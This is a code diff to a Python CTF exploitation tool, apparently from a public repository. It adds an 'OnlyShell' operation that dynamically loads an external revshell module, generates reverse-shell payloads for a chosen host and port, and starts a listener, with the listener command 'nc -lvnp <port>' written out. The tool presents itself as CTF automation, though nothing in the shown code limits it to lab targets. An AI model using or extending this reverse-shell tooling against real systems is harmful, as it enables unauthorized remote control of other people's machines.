@@ -9,12 +9,38 @@ Usage  : echo '{"target":"<ip>","params":{"operation":"run","ctf":"simplectf"}}'
 import sys
 import os
 import json
+import socket
 import subprocess
 import shutil
 import re
 import time
+import importlib.util as _ilu
 from pathlib import Path
 from datetime import datetime
+
+# ── OnlyShell reverse shell handler ──────────────────────────────────────────
+def _local_ip() -> str:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
+        return ip
+    except Exception:
+        return "0.0.0.0"
+
+_RS_MOD = None
+def _rs():
+    global _RS_MOD
+    if _RS_MOD is not None:
+        return _RS_MOD
+    for _c in [
+        Path(__file__).parent.parent / "network" / "revshell" / "revshell.py",
+        Path(__file__).parent / "revshell" / "revshell.py",
+    ]:
+        if _c.exists():
+            _s = _ilu.spec_from_file_location("revshell", _c)
+            _m = _ilu.module_from_spec(_s); _s.loader.exec_module(_m)
+            _RS_MOD = _m; return _m
+    return None
 
 VERSION      = "1.1.0"
 REPO_URL     = "https://github.com/0xb0rn3/CTFs"
@@ -469,6 +495,31 @@ class CTFPwn:
 
     # ── entry ─────────────────────────────────────────────────────────────────
 
+    def _op_shell(self):
+        """OnlyShell handler: start listener + generate CTF-ready payloads."""
+        lhost    = self.params.get('lhost') or _local_ip()
+        lport    = int(self.params.get('lport', 4444))
+        serve    = str(self.params.get('serve', 'true')).lower() in ('true', '1', 'yes')
+        duration = int(self.params.get('duration', 60))
+        ptype    = self.params.get('payload_type', 'all')
+        rs = _rs()
+        if rs is None:
+            self.errors.append("revshell module not found — check tools/network/revshell/"); return
+        gen = rs.op_generate(lhost=lhost, lport=lport, shell=ptype)
+        self.findings.append({
+            'type': 'shell_payloads',
+            'lhost': lhost, 'lport': lport,
+            'payloads': gen.get('payloads', {}),
+            'listener': f"nc -lvnp {lport}",
+        })
+        self.ok(f"Payloads generated — listener: nc -lvnp {lport}")
+        self.log(f"Starting reverse shell handler on {lhost}:{lport}…")
+        if serve:
+            rs.op_serve([lport], lhost=lhost)
+        else:
+            r = rs.op_listen([lport], duration=duration, lhost=lhost)
+            self.findings.append({'type': 'shell_sessions', **r})
+
     def execute(self) -> dict:
         ops = {
             "list":   self._op_list,
@@ -477,6 +528,7 @@ class CTFPwn:
             "run":    self._op_run,
             "info":   self._op_info,
             "search": self._op_search,
+            "shell":  self._op_shell,
         }
         fn = ops.get(self.operation)
         if not fn:
